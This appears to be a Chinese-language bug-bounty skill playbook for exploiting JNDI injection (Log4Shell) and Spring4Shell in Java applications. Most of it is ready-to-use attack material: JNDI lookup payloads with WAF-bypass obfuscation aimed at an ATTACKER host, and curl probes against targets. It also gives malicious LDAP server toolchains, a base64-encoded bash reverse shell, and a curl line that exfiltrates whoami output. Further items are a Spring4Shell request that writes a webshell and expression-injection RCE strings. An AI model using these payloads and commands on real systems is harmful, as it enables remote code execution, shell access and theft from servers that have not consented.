# JNDI 注入 / Log4Shell 深度手册

← 回主入口 [../../SKILL.md](../../SKILL.md)

> **CWE**: CWE-74 / CWE-502 | **CVE 家族**: Log4j (CVE-2021-44228 / 45046 / 45105), Spring4Shell (CVE-2022-22965), SnakeYAML
> **核心**: Java 应用把用户控制字符串传给 JNDI lookup, 导致 LDAP/RMI/DNS 远程类加载 → RCE
> **回报**: 严重, 赏金稳定 $3000-$30000+ (视系统关键性)

---

## 0. First-pass Payload Set

```
${jndi:ldap://ATTACKER/a}
${jndi:rmi://ATTACKER:1099/a}
${jndi:dns://ATTACKER/a}              # 只证存在, 最安全的探测
${jndi:ldaps://ATTACKER/a}
${${::-j}ndi:ldap://ATTACKER/a}
${${lower:j}ndi:ldap://ATTACKER/a}
${${env:X:-j}ndi:ldap://ATTACKER/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//ATTACKER/a}
```

> OOB 子域获取 → [../oob-infrastructure.md](../oob-infrastructure.md)

---

## 1. 识别触发点 (Log4j 场景)

**原则**: 任何被服务端记日志的字符串都是候选。

| 位置 | 优先级 | 原因 |
|------|-------|------|
| `User-Agent` | ★★★★★ | 所有 Web 都记 UA |
| `Referer` | ★★★★ | nginx/log4j 常记 |
| `X-Forwarded-For` / `X-Real-IP` | ★★★★ | 经反代透传 |
| `X-Api-Version` / `X-Client-*` | ★★★ | 自定义 header 常被记 |
| Authorization(Bearer/Basic 内容) | ★★★ | 登录失败日志 |
| 登录用户名 | ★★★★ | `Invalid login for ${username}` |
| 搜索框 / 表单 | ★★★ | 日志打点 |
| Cookie 值 | ★★ | 部分框架记录 |
| Host header | ★★ | vhost 路由日志 |
| URL path 任意段 | ★★★ | 404 日志 / Spring 路由 |
| 异常消息(参数类型错误) | ★★★★ | 错误处理器 logger.error(msg) |

**探测模板** (UA 注入 + DNS OOB):
```bash
curl -H "User-Agent: \${jndi:dns://$(uuidgen).ATTACKER/}" https://target.com/
curl -H "Referer: \${jndi:ldap://$(uuidgen).ATTACKER/a}" https://target.com/login
```

---

## 2. 绕过 WAF 的 payload 矩阵

### 2.1 字符拆分 (最常用)

```
${${::-j}${::-n}${::-d}${::-i}:ldap://ATTACKER/a}
${${lower:J}${lower:N}${lower:D}${lower:I}:ldap://ATTACKER/a}
${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://ATTACKER/a}
```

### 2.2 环境变量默认值 (env:X:-j 表示若 X 为空则用 j)

```
${${env:FOO:-j}ndi:ldap://ATTACKER/a}
${${env:BARFOO:-j}${env:BARFOO:-n}${env:BARFOO:-d}${env:BARFOO:-i}:ldap://ATTACKER/a}
```

### 2.3 嵌套替换

```
${${::-${::-$${::-j}}}ndi:ldap://ATTACKER/a}
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://ATTACKER/a}
```

### 2.4 Unicode / URL 编码

```
%24%7Bjndi%3Aldap%3A%2F%2FATTACKER%2Fa%7D
${\u006Andi:ldap://ATTACKER/a}
```

### 2.5 协议改写

```
${jndi:ldap://ATTACKER:1389/a}    # 非标准端口
${jndi:iiop://ATTACKER/a}          # CORBA
${jndi:corba://ATTACKER/a}
${jndi:nis://ATTACKER/a}
```

---

## 3. 拿到 RCE 的工具链

### 3.1 JNDIExploit (推荐, 一站式)

```bash
# 启动恶意 LDAP + HTTP 服务器
java -jar JNDIExploit-1.x-SNAPSHOT.jar -i ATTACKER_IP -p 8888

# 输出示例 payload:
# ${jndi:ldap://ATTACKER:1389/TomcatBypass/Command/Base64/YmFzaCAtaSAmPi9kZXYvdGNwLzEuMi4zLjQvNDQ0NCAwPiYx}

# 触发后本地 nc 监听反弹
nc -lvnp 4444
```

### 3.2 rogue-jndi

```bash
git clone https://github.com/veracode-research/rogue-jndi
mvn package
java -jar RogueJndi-1.1.jar --command "curl http://ATTACKER/$(whoami)" --hostname ATTACKER
```

### 3.3 marshalsec (LDAP/RMI 服务器)

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://ATTACKER:8888/#Exploit"
# 配合自建的 Exploit.class (含 static 代码块做 RCE)
```

---

## 4. 影响分层 (别写低)

| Payload 级别 | 证明了什么 |
|-------------|-----------|
| `${jndi:dns://ATTACKER/}` + DNS 收到 | Log4j 存在, JNDI lookup 可达 **(低: 仅证存在)** |
| `${jndi:ldap://ATTACKER/}` + LDAP 收到 connection | 可出站, 但不保证 RCE |
| 加载到 ATTACKER 托管的 class | 完整 gadget, **RCE 成功** |
| `whoami` / `id` 外带回 | **严重**: 完整 RCE + 身份证明 |
| 服务账号是 root / SYSTEM | **严重+**: 系统级影响 |

---

## 5. Spring4Shell (CVE-2022-22965)

Spring MVC 对 Class 类递归绑定:

```bash
# 一个请求污染 AccessLogValve 写 webshell
curl -X POST https://target.com/endpoint \
  -H "suffix: %>//" \
  -H "c1: Runtime" \
  -H "c2: <%" \
  -H "DNT: 1" \
  --data "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20..."
```

条件: Tomcat + Spring >= 5.3.0 < 5.3.18 / 5.2.0 < 5.2.20 + JDK 9+。

---

## 6. 相邻 Java 表达式注入 (容易混淆)

| 漏洞 | 示例 | 文件 |
|------|------|------|
| Spring EL (SpEL) | `#{T(java.lang.Runtime).getRuntime().exec('id')}` | 本文件 §5 / [ssti.md](ssti.md) §Thymeleaf |
| OGNL (Struts2 S2-xxx) | `%{(#_=@...exec('id'))}` | — |
| FreeMarker SSTI | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | [ssti.md](ssti.md) §Freemarker |
| JSP EL | `${pageContext.request.servletContext.getResource('/...')}` | — |
| Velocity | `$class.forName(...)` | [ssti.md](ssti.md) §Velocity |
| Groovy (Jenkins Script Console) | `"id".execute().text` | — |

---

## 7. Testing Checklist

- [ ] 每个受日志的 header (UA / Referer / XFF / X-*) 测 `${jndi:dns://...}` DNS 回调
- [ ] 登录 / 注册 / 搜索 的字符串字段测
- [ ] 未受白名单的 URL path 测 (404 处理器常记日志)
- [ ] 测试至少 3 种绕过 (字符拆分 / env / 嵌套) 抵御 WAF
- [ ] LDAP 回调收到但无 RCE → 检查 JDK 版本, 可能是高版本默认禁 trust URL
- [ ] 尝试 Spring4Shell payload (若目标是 Spring)
- [ ] 检测 SpEL / OGNL / FreeMarker 并发测
- [ ] 日志内非字符串参数(数字/布尔)不触发, 聚焦字符串

---

## 8. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| DNS 回调收到但 HTTP/LDAP 没有 | 仅证明 JNDI lookup 可达, 不等于 RCE |
| ${jndi:...} 被回显但未记日志 | 不是漏洞, 只是参数反射 |
| 高版本 JDK (8u191+, 11.0.1+) 默认 `com.sun.jndi.ldap.object.trustURLCodebase=false` | LDAP 回调可达但 gadget 加载被阻 |
| WAF 拦截 payload 但回包 403 | 不等于没漏洞, 换编码/拆分再试 |
| DNSLog 长时间无回调 | 目标可能只能出 HTTP, 试 `${jndi:ldap://ATTACKER:80/}` |
| 受 target `-Dlog4j2.formatMsgNoLookups=true` | 补丁生效, Payload 不会触发 lookup |

---

## 9. 影响证明

- **低**: DNS OOB 回调, 证明 lookup 可达
- **中**: LDAP/RMI 回调, 证明出站至 1389/1099
- **高**: Class 加载成功, 本地命令执行
- **严重**: whoami / id 外带回, 含主机名 / 服务账号身份
- **严重+**: 服务是 root / SYSTEM / 可读取 `/etc/shadow` 或 `c:\windows\system32\config\SAM`

---

## 10. 相关参考

- 主入口 → [../../SKILL.md](../../SKILL.md)
- OOB 基础设施 (必配合) → [../oob-infrastructure.md](../oob-infrastructure.md)
- 反序列化 → [deserialize.md](deserialize.md)
- SSTI 系列 (FreeMarker / Velocity / Thymeleaf) → [ssti.md](ssti.md)
- 命令注入 → [cmdi.md](cmdi.md)

---

**CWE**: CWE-74 / CWE-502 | **CVE**: CVE-2021-44228 (Log4j 9.8) / CVE-2022-22965 (Spring4Shell 9.8) | **CVSS 典型**: 10.0 (未授权 + RCE + 默认配置) / 9.8 (需一点条件)
